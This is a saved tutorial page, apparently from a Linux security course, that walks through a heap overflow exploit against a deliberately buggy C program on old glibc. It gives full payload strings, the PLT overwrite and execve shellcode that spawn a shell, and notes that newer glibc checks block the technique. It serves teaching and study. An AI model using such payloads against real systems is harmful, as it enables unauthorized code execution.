<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<!-- saved from url=(0047)https://www.win.tue.nl/~aeb/linux/hh/hh-11.html -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 <title>Hackers Hut: Exploiting the heap</title>
 
 <link rel="stylesheet" type="text/css" href="./Hackers Hut_ Exploiting the heap_files/hh.css">
 <link href="https://www.win.tue.nl/~aeb/linux/hh/hh-12.html" rel="next">
 <link href="https://www.win.tue.nl/~aeb/linux/hh/hh-10.html" rel="previous">
 <link href="https://www.win.tue.nl/~aeb/linux/hh/hh.html#toc11" rel="contents">
</head>
<body waid71fa0d88-5390-4b5b-a2f4-e45fa93d85e2="SA password protect entry checker">
<a href="https://www.win.tue.nl/~aeb/linux/hh/hh-12.html">Next</a>
<a href="https://www.win.tue.nl/~aeb/linux/hh/hh-10.html">Previous</a>
<a href="https://www.win.tue.nl/~aeb/linux/hh/hh.html#toc11">Contents</a>
<hr>
<h2><a name="s11">11.</a> <a href="https://www.win.tue.nl/~aeb/linux/hh/hh.html#toc11">Exploiting the heap</a></h2>

<p>Sometimes the buffer that overflows is not a local buffer on the stack,
but a buffer obtained from <code>malloc()</code> and freed with <code>free()</code>.
Let us do a small demo.</p>
<p>Exploit the program <code>heapbug.c</code>:
</p><pre>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;

int main(int argc, char **argv) {
        char *p, *q;

        p = malloc(1024);
        q = malloc(1024);
        if (argc &gt;= 2)
                strcpy(p, argv[1]);
        free(q);
        free(p);
        return 0;
}
</pre>
<p></p>
<p>There is an overflow here. Calling the program with a long
argument provokes a crash:
</p><pre>% ./heapbug `perl -e 'print "A"x5000'`
Segmentation fault
</pre>
<p></p>
<p>We would like to spawn a shell from this buggy program.</p>

<h2><a name="ss11.1">11.1</a> <a href="https://www.win.tue.nl/~aeb/linux/hh/hh.html#toc11.1">Malloc</a>
</h2>

<p>The routines <code>malloc()</code> and <code>free()</code> manage
memory obtained via the <code>sbrk()</code> and <code>mmap()</code>
system calls. 
<a href="http://gee.cs.oswego.edu/dl/html/malloc.html">Here</a>
a description of Doug Lea's malloc, a bit older than
the version of malloc described below and used in this demo.</p>
<p>Memory is carved up into chunks.
The first (4-byte) field of each chunk give its size,
and since the size is guaranteed to be divisible by 8
the low order bits can be status bits.</p>
<p>
</p><figure>
<eps file="absent">
<img src="./Hackers Hut_ Exploiting the heap_files/malloc.png">
</eps></figure>
<p></p>
<p>A free chunk also ends with a size field, so that merging a
chunk with the previous one (when both are free) is easy.
A user chunk only has a size field at the beginning.
Bit 0 of the status field is 0 when the preceding chunk exists
and is free and has a size field at the end.</p>
<p>A free chunk also has two pointers belonging to the doubly linked list
it is an element of. (Thus, chunks have size not less than 16 bytes.)</p>
<p>The implementation manages chunks using the struct</p>
<p>
</p><pre>struct chunk {
        int prev_size;
        int size;
        struct chunk *fd;
        struct chunk *bk;
};
</pre>
<p></p>
<p>(where this struct straddles two chunks: the first four bytes
belong to the previous chunk, the last twelve bytes belong
to the present chunk). Thus, the <code>prev_size</code> field here
is defined only when <code>(size &amp; 1) == 0</code>.</p>
<p>Since the pointer returned by <code>malloc()</code> must be suitable
for all purposes it is aligned on an 8-byte boundary.
Thus, when the user asks for size <code>n</code>, the chunk size
will be not less than the smallest multiple of eight above <code>n+4</code>.</p>
<p>Strategies for allocation and freeing are non-trivial.
Thus, it is difficult to predict where areas will be allocated,
and whether two subsequent <code>malloc()</code>'s will return
adjacent areas. But in our tiny demo program, this happens to be
the case on the current machine (with glibc 2.2.4).</p>

<h2><a name="ss11.2">11.2</a> <a href="https://www.win.tue.nl/~aeb/linux/hh/hh.html#toc11.2">Exploit free()</a>
</h2>

<p>In the above example, the segfault occurs in <code>strcpy()</code>
and is not exploitable. It happens because the copy accesses
unmapped memory:</p>
<p>
</p><pre>% ltrace ./heapbug `perl -e 'print "A"x2368'`
__libc_start_main(0x080484b0, 2, 0xbffff1c4, 0x08048324, 0x08048560 &lt;unfinished ...&gt;
__register_frame_info(0x08049598, 0x0804969c, 0xbffff168, 0x080483de, 0x08048324) = 0x40163da0
malloc(1024)                                      = 0x080496c0
malloc(1024)                                      = 0x08049ac8
strcpy(0x080496c0, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"... &lt;unfinished ...&gt;
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
</pre>
<p></p>
<p>but with a shorter string (that still overflows the buffer)
the segfault occurs in <code>free()</code>, and that one is exploitable.</p>
<p>
</p><pre>% ltrace ./heapbug `perl -e 'print "A"x2367'`
__libc_start_main(0x080484b0, 2, 0xbffff1c4, 0x08048324, 0x08048560 &lt;unfinished ...&gt;
__register_frame_info(0x08049598, 0x0804969c, 0xbffff168, 0x080483de, 0x08048324) = 0x40163da0
malloc(1024)                                      = 0x080496c0
malloc(1024)                                      = 0x08049ac8
strcpy(0x080496c0, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...) = 0x080496c0
free(0x08049ac8)                                  = &lt;void&gt;
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
</pre>
<p></p>
<p>Let us find where this happens.</p>
<p>
</p><pre>% gdb ./heapbug
GNU gdb Red Hat Linux 7.x (5.0rh-15) (MI_OUT)
...
(gdb) run `perl -e 'print "A"x2367'`
...
Program received signal SIGSEGV, Segmentation fault.
chunk_free (ar_ptr=0x40161620, p=0x8049ac0) at malloc.c:3180
(gdb) x/i $pc
0x400adc6e &lt;chunk_free+46&gt;:     mov    0x4(%edx),%esi
</pre>
<p></p>
<p>Comparing the assembly code with the source of <code>free()</code>
in <code>malloc.c</code> around line 3180 in glibc-2.2.4, we see
that the segfault occurs in </p>
<p>
</p><pre>  sz = hd &amp; ~PREV_INUSE;
  next = chunk_at_offset(p, sz);
  nextsz = chunksize(next);
</pre>
<p></p>
<p>that is, the size field is used to find the next chunk
and since it was overwritten by <code>"AAAA"</code>,
<code>next</code> will be a bad address and getting <code>chunksize(next)</code>
segfaults.</p>
<p>OK. So, when overwriting the size field, we must take care
that the computed location of the next chunk lies in allocated
memory. Since small positive numbers contain NUL bytes, it is
easiest to use a small negative number.</p>
<p>Now the test</p>
<p>
</p><pre>  if (next == top(ar_ptr))                         /* merge with top */
</pre>
<p></p>
<p>in <code>malloc.c</code> fails, and we reach the interesting code</p>
<p>
</p><pre>  if (!(hd &amp; PREV_INUSE))                    /* consolidate backward */
  {
    prevsz = p-&gt;prev_size;
    p = chunk_at_offset(p, -(long)prevsz);
    sz += prevsz;

    if (p-&gt;fd == last_remainder(ar_ptr))     /* keep as last_remainder */
      islr = 1;
    else
      unlink(p, bck, fwd);
  }
</pre>
<p></p>
<p>where <code>unlink()</code> is defined as</p>
<p>
</p><pre>#define unlink(p, bck, fwd)                             \
{                                                       \
  bck = p-&gt;bk;                                          \
  fwd = p-&gt;fd;                                          \
  fwd-&gt;bk = bck;                                        \
  bck-&gt;fd = fwd;                                        \
}
</pre>
<p></p>
<p>That is, we check that the <code>prev_size</code> field is valid,
then subtract that amount from the chunk pointer <code>p</code>
to find the chunk preceding the one that is freed, and then unlink
it from its linked list - presumably because these two adjacent chunks
will be merged, and the result belongs in a different linked list
(since the linked lists are per-size).</p>
<p>But we control <code>p-&gt;prev_size</code>, and by giving it a small
negative value the computed place for the start of the preceding
chunk will be inside the buffer. That is, we control the values
of <code>bck</code> and <code>fwd</code>, and using the assignment</p>
<p>
</p><pre>  fwd-&gt;bk = bck;
</pre>
<p></p>
<p>we can write an arbitrary value at an arbitrary place.
Of course the value is not completely arbitrary: we cannot use NUL bytes.
There is another restriction: the following assignment</p>
<p>
</p><pre>  bck-&gt;fd = fwd;
</pre>
<p></p>
<p>will segfault, unless <code>bck</code> is a valid address.
So, given two values <code>A</code> and <code>B</code> chosen by me,
both acceptable addresses, <code>free()</code> will do
<code>*(A+12) = B</code> and <code>*(B+8) = A</code>.</p>
<p>Let us try. Add an integer <code>n</code> to the source of this
buggy program, and overwrite its value.</p>
<p>
</p><pre>% cat bug1.c
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;

int n = 5;

int main(int argc, char **argv) {
        char *p, *q;

        p = malloc(1024);
        q = malloc(1024);
        if (argc &gt;= 2)
                strcpy(p, argv[1]);
        free(q);
        printf("n = 0x%08x\n", n);
        free(p);
        return 0;
}
% cc -o bug1 bug1.c
% nm ./bug1 | grep -w n
080495f4 D n
% ./bug1 `perl -e 'print "A"x1024 . "\xfc\xff\xff\xff"x2 . "XXXX" . "\xe8\x95\x04\x08" . "\x80\xff\xff\xbf"'`
n = 0xbfffff80
Segmentation fault
%
</pre>
<p></p>
<p>Success! Watch carefully: <code>p</code> and <code>q</code> are 1032 (0x408) apart.
The second <code>0xfffffffc</code> overflows the size field of
the buffer <code>q</code> with an even value (-4), so the prev_size
field (also -4) is valid, and we subtract it from the pointer
(<code>q-8</code>) to the struct chunk of <code>q</code> in order to
get the pointer (<code>q-4</code>) to its predecessor.
Now the assignments <code>fwd-&gt;bk = bck; bck-&gt;fd = fwd;</code>
become <code>*(A+12) = B; *(B+8) = A</code> where
<code>A = 0x080495e8</code> is <code>&amp;n - 12</code> and <code>B = 0xbfffff80</code>
is some random address on the stack. Now <code>*(A+12) = B</code>
does <code>n = B</code>, and that is what we see.</p>
<p>Very good. We can write into memory.</p>

<h2><a name="ss11.3">11.3</a> <a href="https://www.win.tue.nl/~aeb/linux/hh/hh.html#toc11.3">Overwrite a PLT entry</a>
</h2>

<p>Our exercise was to exploit the original program <code>heapbug</code>,
not to change the value of <code>n</code> in <code>bug1</code>.
The call <code>free(p)</code> that follows the <code>free(q)</code>
will crash because we corrupted the data structures, so it is
better to avoid that second call. That is achieved by overwriting
the PLT entry of <code>free()</code>.</p>
<p>
</p><pre>% objdump -d heapbug
...
Disassembly of section .plt:
...
 804838c:       ff 25 90 96 04 08       jmp    *0x8049690
...
Disassembly of section .text:
...
 8048510:       e8 77 fe ff ff          call   804838c &lt;_init+0x68&gt;
...
</pre>
<p></p>
<p>The C program does not call <code>free()</code> directly, since the
address is unknown at translation time. The call is indirect
via an entry in the program linking table that is filled by the
dynamic loader. If we overwrite that entry with our favourite address,
we will jump there instead.</p>
<p>The required address can be found more quickly by</p>
<p>
</p><pre>% objdump -R heapbug | grep free
08049690 R_386_JUMP_SLOT   free
</pre>
<p></p>
<p>So, now the next attempt. Where shall we jump? Don't know.
Maybe into the stack and crash - this is just
to check that the setup works.</p>
<p>
</p><pre>% gdb ./heapbug
...
(gdb) run `perl -e 'print "A"x1024 . "\xfc\xff\xff\xff"x2 . "XXXX" . "\x84\x96\x04\x08" . "\x70\xff\xff\xbf"'`

Program received signal SIGSEGV, Segmentation fault.
0xbfffff72 in ?? ()
(gdb)
</pre>
<p></p>
<p>Very good. When the second <code>free()</code> is called, we jump to an
address of our own choosing.</p>

<h2><a name="ss11.4">11.4</a> <a href="https://www.win.tue.nl/~aeb/linux/hh/hh.html#toc11.4">Adapted shellcode</a>
</h2>

<p>Of course we wanted to spawn a shell, and in the instruction pair
<code>*(A+12) = B; *(B+8) = A</code>, we can choose <code>A+12</code> to be
the PLT entry of <code>free()</code>, and <code>B</code> the address of
our shellcode on the stack. If we do that, then the second assignment
in that pair will destroy bytes 8-11 of that shellcode.
A simple way out is to prefix our favourite shellcode with a 12-byte
header</p>
<p>
</p><pre>eb 0a    jmp 1f
90       nop
90       nop
90       nop
90       nop
90       nop
90       nop
90       nop
90       nop
90       nop
90       nop
1f:
</pre>
<p></p>
<p>Let us try.</p>
<p>
</p><pre>% SHELLCODE=`perl -e 'print "\xeb\x0a" . "\x90"x10 . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'`
% export SHELLCODE
% ./xxxxadr SHELLCODE      # getenv("SHELLCODE")
0xbffffe9c
% ./heapbug `perl -e 'print "A"x1024 . "\xfc\xff\xff\xff"x2 . "XXXX" . "\x84\x96\x04\x08" . "\x9c\xfe\xff\xbf"'`
sh-2.05$
</pre>
<p></p>
<p>Excellent.</p>
<p>This finishes the first demo: spawn a shell from <code>heapbug.c</code> on a
machine with glibc-2.2.4. The details of these exploits tend to be strongly
dependent on the glibc version, and more recent versions are more
difficult to exploit because of added integrity checks.</p>

<h2><a name="ss11.5">11.5</a> <a href="https://www.win.tue.nl/~aeb/linux/hh/hh.html#toc11.5">glibc-2.3.3</a>
</h2>

<p>Let us try the same on a different machine.</p>
<p>
</p><pre>% objdump -R heapbug | grep free
080496b0 R_386_JUMP_SLOT   free
% ltrace ./heapbug `perl -e 'print "A"x1024 . "\xfc\xff\xff\xff"x2 . "XXXX" . "\xa4\x96\x04\x08" . "\x70\xff\xff\xbf"'`
__libc_start_main(0x0804841c, 2, 0xbffff134, 0x08048510, 0x080484a0 &lt;unfinished ...&gt;
malloc(1024)                                      = 0x0804a008
malloc(1024)                                      = 0x0804a410
strcpy(0x0804a008, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...) = 0x0804a008
free(0x0804a410 &lt;unfinished ...&gt;
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
</pre>
<p></p>
<p>Hmm. We never reach the second <code>free()</code>. The first one crashes.
Let us compare gdb data with the malloc source. Which glibc is this?</p>
<p>
</p><pre>% ldd ./heapbug
        linux-gate.so.1 =&gt;  (0xffffe000)
        libc.so.6 =&gt; /lib/tls/libc.so.6 (0x4003b000)
        /lib/ld-linux.so.2 =&gt; /lib/ld-linux.so.2 (0x40000000)
%  /lib/tls/libc.so.6
GNU C Library stable release version 2.3.3 (20040917), by Roland McGrath et al.
...
</pre>
<p></p>
<p>This seems to be glibc-2.3.3. However, it soon appears that it is not
precisely that. For example, vanilla glibc-2.3.3 does not contain the
symbol <code>malloc_printerr</code> seen here.
What distribution do we have here?</p>
<p>
</p><pre>% ls -d /etc/*rele*
/etc/lsb-release  /etc/lsb-release.d  /etc/SuSE-release
% cat /etc/SuSE-release
SuSE Linux 9.2 (i586)
VERSION = 9.2
%
</pre>
<p></p>
<p>And what version of glibc?</p>
<p>
</p><pre>% rpm -qf /lib/tls/libc.so.6
glibc-2.3.3-118
%
</pre>
<p></p>
<p>OK. Retrieve <code>glibc-2.3.3-118.src.rpm</code> from a SuSE 9.2 mirror.
It turns out to contain a snapshot <code>glibc-2.3.3-20040916.tar.bz2</code>.
Now we have a source to compare with.</p>
<p>There are several changes. There is an additional status bit</p>
<p>
</p><pre>#define NON_MAIN_ARENA 0x4
#define chunk_non_main_arena(p) ((p)-&gt;size &amp; NON_MAIN_ARENA)
</pre>
<p></p>
<p>forcing us to keep <code>size</code> divisible by 8, not 4. No problem.
Next, there is the annoying check</p>
<p>
</p><pre>    /* Little security check which won't hurt performance: the
       allocator never wrapps around at the end of the address space.
       Therefore we can exclude some size values which might appear
       here by accident or by "design" from some intruder.  */
    if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0))
      {
        malloc_printerr (check_action, "free(): invalid pointer", mem);
        return;
      }
</pre>
<p></p>
<p>It means that <code>p + size</code> cannot be before <code>p</code>.
Consequently, <code>size</code> cannot be a small negative number.
It cannot be a small positive number either, since that would involve
NUL bytes. But we can work around this by letting <code>p + size</code>
point into the stack. OK.</p>
<p>But reading a bit more in this source we are shocked to see</p>
<p>
</p><pre>#define unlink(P, BK, FD) {                                            \
  FD = P-&gt;fd;                                                          \
  BK = P-&gt;bk;                                                          \
  if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                \
    malloc_printerr (check_action, "corrupted double-linked list", P); \
  else {                                                               \
    FD-&gt;bk = BK;                                                       \
    BK-&gt;fd = FD;                                                       \
  }                                                                    \
}
</pre>
<p></p>
<p>Aargh. Our exploit method fails here. New work is needed.</p>


<hr>
<a href="https://www.win.tue.nl/~aeb/linux/hh/hh-12.html">Next</a>
<a href="https://www.win.tue.nl/~aeb/linux/hh/hh-10.html">Previous</a>
<a href="https://www.win.tue.nl/~aeb/linux/hh/hh.html#toc11">Contents</a>


</body></html>